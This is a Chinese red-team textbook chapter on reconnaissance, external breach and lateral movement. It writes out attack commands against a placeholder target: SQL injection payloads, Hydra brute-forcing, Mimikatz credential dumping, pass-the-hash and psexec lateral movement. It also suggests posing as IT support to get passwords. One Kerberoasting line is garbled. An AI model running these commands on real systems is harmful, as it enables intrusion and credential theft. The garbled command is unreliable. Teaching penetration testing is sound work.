## 2.1 准备工作

## 2.2 目标网情搜集

### 2.2.1 何为网情搜集

网情搜集（Cyberspace Intelligence）是红队攻击的重要前置工作，旨在全面了解目标的网络资产、人员、组织结构等信息。

**1. 搜集目标**

- 目标组织的网络架构
- 互联网暴露资产
- 人员信息和社会关系
- 业务流程和系统用途
- 安全防护措施

**2. 搜集原则**

- **全面性**：不放过任何可能的信息
- **准确性**：验证信息的真实性
- **系统性**：有计划有步骤地搜集
- **保密性**：保护自身信息安全

### 2.2.2 网情搜集的主要工作

**1. 资产发现**

```
资产发现流程：

1. 已知域名收集
   ├── 官方网站
   ├── 分支机构域名
   └── 关联公司域名

2. IP资产发现
   ├── IP段扫描
   ├── CDN识别
   └── 云服务商资产

3. 子域名收集
   ├── DNS记录枚举
   ├── 搜索引擎收集
   └── 暴力破解

4. Web资产发现
   ├── 端口扫描
   ├── 指纹识别
   └── 路径探测
```

**2. 社工情报收集**

- 员工信息收集（邮箱、姓名、职位）
- 组织架构了解
- 业务流程熟悉
- 供应商关系梳理

**3. 防护情况评估**

- 安全设备探测
- WAF识别
- CDN使用情况
- 认证机制分析

### 2.2.3 网情搜集的途径

**1. 开源情报（OSINT）**

| 信息源 | 可获取信息 |
|--------|------------|
| 搜索引擎 | 子域名、敏感文件、人员信息 |
| Whois数据库 | 注册信息、注册人联系 |
| DNS查询 | 域名解析记录、子域名 |
| 社交媒体 | 员工信息、公司动态 |
| GitHub/Gitee | 源代码、配置信息 |
| 证书透明度 | 子域名信息 |
| 威胁情报平台 | 历史攻击情报 |

**2. 主动探测**

```
主动探测方法：

1. 端口扫描
   nmap -sS -sV -p 1-65535 target.com
   
2. 指纹识别
   whatweb target.com
   wappalyzer https://target.com
   
3. 目录爆破
   dirb http://target.com/
   gobuster dir -u http://target.com/ -w wordlist.txt
   
4. 漏洞扫描
   nessus scan target
   nuclei -u https://target.com
```

**3. 社工搜集**

- 电话社工：伪装成 IT 支持索要密码
- 邮件社工：钓鱼邮件收集信息
- 现场搜集：物理接近获取信息
- 垃圾桶搜集：查找敏感文件

## 2.3 外网纵向突破

### 2.3.1 何为外网纵向突破

外网纵向突破是红队获取目标网络初始访问权限的过程，是整个攻击链的第一步。

**1. 突破目标**

- 获取目标网络的第一个落脚点
- 建立持久化控制通道
- 为内网横向做准备

**2. 突破难点**

- 目标通常有防火墙、WAF等防护
- 暴露面有限，难以找到入口
- 验证码、IP封禁等反爬措施
- 社工防御意识提升

### 2.3.2 外网纵向突破的主要工作

**1. 漏洞挖掘与利用**

```
常见突破口：

Web应用漏洞：
├── SQL注入
├── XSS跨站脚本
├── 文件上传漏洞
├── 命令执行漏洞
├── 敏感信息泄露
└── 业务逻辑漏洞

第三方组件漏洞：
├── CMS漏洞（WordPress、Drupal等）
├── 中间件漏洞（WebLogic、Tomcat等）
├── 框架漏洞（Struts2、Spring等）
└── 第三方库漏洞

VPN/远程接入漏洞：
├── VPN设备漏洞
├── 认证绕过漏洞
├── 弱口令漏洞
└── 钓鱼获取账号
```

**2. 社工攻击**

```
社工攻击类型：

钓鱼邮件攻击：
├── 恶意附件
├── 钓鱼链接
├── 冒充身份
└── 水坑攻击

物理社工：
├── USB攻击
├── 假冒工作人员
├── 尾随进入
└── 无线热点钓鱼
```

**3. 供应链攻击**

- 利用第三方服务商
- 攻击软件供应链
- 入侵托管服务商
- 篡改安装包

### 2.3.3 外网纵向突破的途径

**1. Web渗透突破**

```sql
-- SQL注入突破示例

判断注入点：
http://target.com/news.php?id=1' --> 报错，存在注入

判断字段数：
http://target.com/news.php?id=1' order by 5 --+ --> 返回正常
http://target.com/news.php?id=1' order by 6 --+ --> 报错，5个字段

获取数据库信息：
http://target.com/news.php?id=-1' union select 1,2,3,4,5 --+

获取当前用户：
http://target.com/news.php?id=-1' union select 1,user(),3,4,5 --+

获取数据库名：
http://target.com/news.php?id=-1' union select 1,database(),3,4,5 --+

获取表名：
http://target.com/news.php?id=-1' union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database() --+
```

**2. 弱点扫描发现**

```
# 使用Nuclei进行漏洞扫描
nuclei -u https://target.com -t vulnerabilities/ -o results.txt

# 使用Burp Suite Pro进行深度扫描
1. 抓取所有请求
2. 使用Active Scan进行漏洞扫描
3. 手动验证漏洞
```

**3. 弱口令突破**

```bash
# 使用Hydra进行SSH弱口令破解
hydra -l admin -P password.txt ssh://target.com

# 使用Metasploit进行RDP破解
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## 2.4 内网横向拓展

### 2.4.1 何为内网横向拓展

内网横向拓展是红队在获取初始主机权限后，在内网环境中扩大控制范围的过程。

**1. 横向目标**

- 控制更多主机
- 获取高价值资产
- 扩大持久化控制
- 最终达成攻击目的

**2. 横向难点**

- 内网隔离措施
- 横向流量监控
- 账号权限限制
- 行为检测系统

### 2.4.2 内网横向拓展的主要工作

**1. 内网信息收集**

```bash
# 查看网络信息
ipconfig /all
route print
netstat -ano

# 查看主机信息
systeminfo
hostname
whoami /all

# 查看域信息
net user /domain
net group /domain
net view /domain
```

**2. 凭据窃取**

```
凭据窃取方法：

Windows环境：
├── Mimikatz工具
│   ├── sekurlsa::logonpasswords  # 获取明文密码
│   ├── sekurlsa::tickets         # 获取Kerberos票据
│   └── lsadump::lsa /patch      # 获取本地账户哈希
├── 内存凭据转储
├── SAM数据库读取
└── 进程注入获取凭据

Linux环境：
├── /etc/passwd
├── /etc/shadow
├── 内存读取
└── 键盘记录
```

**3. 权限提升**

```
本地提权方法：

Windows：
├── 内核漏洞利用（MS16-032、MS17-010等）
├── 服务配置错误
├── 注册表AlwaysInstallElevated
├── 计划任务提权
└── 令牌窃取

Linux：
├── 内核漏洞（Dirty COW等）
├── SUID配置错误
├── sudo配置错误
├── 定时任务提权
└── NFS共享提权
```

### 2.4.3 内网横向拓展的途径

**1. Pass the Hash**

```bash
# 使用Mimikatz进行PtH攻击
sekurlsa::pth /user:administrator /domain:target.local /ntlm:xxxxxxxxxxxx

# 使用CrackMapExec进行批量PtH
crackmapexec smb 192.168.1.0/24 -u administrator -H xxxxxxxxxxxx -d TARGET
```

**2. Pass the Ticket（Kerberos攻击）**

```bash
# 导出票据
sekurlsa::tickets /export

# 导入票据
kerberos::ptt [ticket.kirbi]

# 请求服务票据（Kerberoasting）
request珀st user serviceaccount

# AS-REP Roasting
Get-ADUser -Filter * -Properties * | where { $_.DoesNotRequirePreAuth -eq $True }
```

**3. 域渗透**

```
域渗透主要步骤：

1. 域信息收集
   ├── net user /domain
   ├── net group "Domain Admins" /domain
   └── bloodhound收集

2. 定位关键目标
   ├── 域控制器
   ├── 高权限账户
   ├── 敏感服务器
   └── 备份系统

3. 域控攻击
   ├── DCSync攻击
   ├── Golden Ticket
   ├── Silver Ticket
   └── Skeleton Key
```

**4. 横向移动技术**

```bash
# 使用WMI横向移动
wmic /node:192.168.1.100 /user:admin /password:pass process call create "cmd /c calc"

# 使用SMB横向移动
psexec.py target.com/admin:'password'@192.168.1.100 cmd.exe

# 使用WinRM横向移动
Invoke-Command -ComputerName target -ScriptBlock { whoami }
```

## 本章小结

本章详细介绍了蓝队（红队）攻击的四个阶段：

1. **准备工作**：包括工具准备、技能储备和人才队伍建设
2. **网情搜集**：通过开源情报和主动探测全面了解目标
3. **外网突破**：利用漏洞、社工等手段获取初始访问权限
4. **内网横向**：通过凭据窃取、权限提升扩大控制范围

这四个阶段环环相扣，充分的准备和系统的信息搜集是外网突破的前提，而内网横向则是扩大战果的关键。
